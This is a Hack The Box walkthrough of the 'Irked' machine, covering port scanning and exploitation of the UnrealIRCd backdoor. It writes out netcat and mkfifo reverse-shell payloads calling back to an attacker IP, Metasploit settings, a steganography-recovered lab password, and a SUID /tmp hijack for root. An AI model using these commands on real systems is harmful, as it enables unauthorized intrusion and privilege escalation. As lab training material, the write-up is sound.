# Irked

**Machine ip:** 10.10.10.117

## Enumeration
First thing first, start port scan:
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.117 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.117`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a39552d9-85e5-491a-9959-bdbb8f0dd5c5)

+ The result shows that 7 TCP ports are open:
```
Port 22: OpenSSH 6.7p1
Port 80: Apache httpd 2.4.10
Port 111: rpcbind 2-4
Port 6697: irc
Port 8067: irc
Port 56060: status
Port 65534: irc
```

+ As usual, always start off with enumerating web server first.
+ Visit the web application.
+ Navigate to `http://10.10.10.117/`, and an irc application works.
+ View Page Source, and there's no useful information.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2f9bb664-f485-4f90-970d-bb4c2973f3dd)

+ Directory fuzzing to enumerate directories:
```
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.117/ -k -n -x html,php,txt -r -t 50
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/882e7f81-c5d1-4ebb-9182-f853ce3aaa67)

+ The **/manual** directory directs to the default Apache HTTP server page, and nothing's interesting here, too.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/78ebc503-c04b-4742-81c6-fa9919dae27a)

+ Check other ports. Ports 22 OpenSSH 6.7p1, and port 111 rpcbind 2–4 aren't promising. Ports 6697, 8067 and 65534 runs UnrealIRCd.
+ Check if there are any nmap scripts for irc.
+ To list related scripts: `ls -l /usr/share/nmap/scripts/irc*`
+ **Alternatively**, `find /usr/share/nmap/scripts -name '*irc*'`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3d0e30f9-e813-4d2b-8100-6225d57fb637)

+ Check `/usr/share/nmap/scripts/irc-unrealircd-backdoor.nse` [nmap nse script](https://nmap.org/nsedoc/scripts/irc-unrealircd-backdoor.html). It shows us that nmap detects if it's vulnerable, and also it starts a netcat listener that would give the attack machine a shell on the target system.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/53d45740-786a-4444-bc30-86628f3f09f1)

+ First, run an nmap scan to determine which of these ports are vulnerable to the backdoor.
```
nmap -p 6697,8067,65534 --script=irc-unrealircd-backdoor 10.10.10.117
```

+ Port 8067 is vulnerable.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bca03c40-0895-4f7f-b1d9-aeb4c1d0711d)



## Gaining Access

### Method 1
+ Start a netcat listener on the attack machine: `nc -lnvp 4444`
+ Try to send a reverse shell to the attack machine netcat listener from the target machine.
```
nmap -p 8067 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.14.6 4444" 10.10.10.117
```

+ Get the low level shell.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b1a5b205-1807-4db2-8333-5c924009a39d)


+ Do more stable shell.
```
script /dev/null -c bash
CTRL^Z: Ctrl + Z
stty raw -echo; fg
reset
terminal type? 'screen' or 'xterm'
export TERM=xterm  
export SHELL=bash
stty rows 55 columns 285
```

+ There's no permission to read the user flag, and we need to escalate privileges.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/54a47658-1c3e-4daa-ac61-9b5ce93d48b7)


### Method 2
+ Check whether it has any exploits: `searchsploit UnrealIRCd`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6933e0b2-171c-4182-b635-9cf19572cdaf)

+ CVE-2010-2075 [1-metasploit](https://www.exploit-db.com/exploits/16922) , [2-manual](https://www.exploit-db.com/exploits/13853)

+ **Firstly**, click on [1-metasploit](https://www.exploit-db.com/exploits/16922) to see connection shape.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/19d728ce-af42-4718-b8f3-3ece0e9ec196)

+ **Secondly**, click on [2-manual](https://www.exploit-db.com/exploits/13853), and review it.
+ See payload options in the below:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7433fb58-b628-4b19-97b4-24e645f9a588)

+ Start netcat listener on the attack machine: `nc -lnvp 4444`
+ Connect to the target through the previous discovered vulnerable port **8067** with netcat on the attack machine's other terminal: `nc 10.10.10.117 8067`
+ Customize the payload to get a revershell specifying the ip and port number on the connected netcat connection of the target:
```
AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.6 4444 >/tmp/f
```

+ Get the ircd's low level shell like in the above's [first method](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/16_Irked.md#method-1).

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b49d1763-6818-48b1-9c01-75fc4b5499ab)

+ In the same way, you can upgrade it to a better shell.
```
python -c 'import pty; pty.spawn("/bin/bash")'
CTRL^Z: Ctrl + Z
stty raw -echo; fg
export TERM=xterm  
export SHELL=bash
```

+ **Alternatively**, it is possible to write your own backdoor exploit like [here](https://0xdf.gitlab.io/2019/04/27/htb-irked.html#script-it).
+ [script 1](https://github.com/h4md153v63n/Python_Scripts/blob/master/unreal_irc_backdoor/README.md#exploitpy).

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/eef00843-2e99-4fd6-b6b5-ab5b850fd4a9)

+ [script 2](https://github.com/h4md153v63n/Python_Scripts/blob/master/unreal_irc_backdoor/README.md#exploit2py).

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/591f1bad-ad38-45d0-b1fa-b39b769700d5)

### Method 3
+ `msfconsole -q`
+ `use exploit/unix/irc/unreal_ircd_3281_backdoor`
+ `set RHOSTS 10.10.10.117`
+ `set RPORT 8067`
+ `show payloads`
+ `set PAYLOAD cmd/unix/reverse`
+ `set LHOST 10.10.14.6`
+ `set LPORT 4444`
+ `exploit`




## Privilege Escalation: from 'ircd' to 'djmardov'
+ **Alternatively**, you can skip this step, and continue directly with root privilege escalation step [Privilege Escalation: from 'djmardov' to 'root'](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/16_Irked.md#privilege-escalation-from-djmardov-to-root). It's up to you.
+ In **/home/djmardov/Documents**, there's a hidden file **.backup**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4cd93b71-8d2b-4e62-ad71-4cc5ff375314)

+ Take note of `UPupDOWNdownLRlrBAbaSSss` with the reference to steg.
+ Then download the emoji image file on **http://10.10.10.117/** irc home page: `wget 10.10.10.117/irked.jpg`
+ Try to extract data from image **irked.jpg** with discovered passphrase `UPupDOWNdownLRlrBAbaSSss`:
```
steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8f73a461-00a4-487a-b18e-cbc48d325ae6)

+ Discovered **djmardov**'s password `Kab6h+m+bbp2J:HG`.
+ Login with `djmardov`:`Kab6h+m+bbp2J:HG` credentials with **su** or **ssh**.
+ Get the user flag with djmardov's privileges.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9d597387-811b-42a8-94dd-cdf4ced48cb8)


## Privilege Escalation: from 'djmardov' to 'root'
+ Check the file which has the SUID bit set.
+ `find / -type f -user root -perm /4000 -exec ls -l {} \; 2>/dev/null`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/57b570f0-e63f-4226-9bef-a3f499d408a0)

+ We arent't familiar with the file, unknown SUID binary **/usr/bin/viewuser**, and run it to see what it does.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/353a8dc7-b660-48c6-91be-04c6e3862ba3)

+ Trying to run the file we see it is trying to execute /tmp/listusers, and it is being executed as root.
+ Interestingly, this file doesn't exist in /tmp, and it throws an error saying that sh can't find **/tmp/listusers**.
+ **Since the file is owned by root, the file will execute with root privileges.**

+ Add `echo bash > /tmp/listusers`, and give execute permission `chmod +x /tmp/listusers`.
+ Then run: `viewuser`.
+ Get the root shell, and read root flag.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/52f52285-3812-4d81-bf7b-927e71b9ae4c)



# References & Alternatives
+ https://vvmlist.github.io/#irked
+ https://0xdf.gitlab.io/2019/04/27/htb-irked.html
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/irked-writeup-w-o-metasploit
+ https://manuelvazquez-contact.gitbook.io/oscp-prep/hack-the-box/irked
+ https://medium.com/@Inching-Towards-Intelligence/htb-irked-50-100-ff10595be50d
+ https://www.hackingarticles.in/hack-the-box-irked-walkthrough/
+ https://0xrick.github.io/hack-the-box/irked/
+ https://steflan-security.com/hack-the-box-irked-walkthrough/
+ https://gianrathgeb.github.io/hackthebox/writeup/linux/irked/
+ https://www.siberportal.org/red-team/penetration-testing/hack-the-box-irked-cozumu/
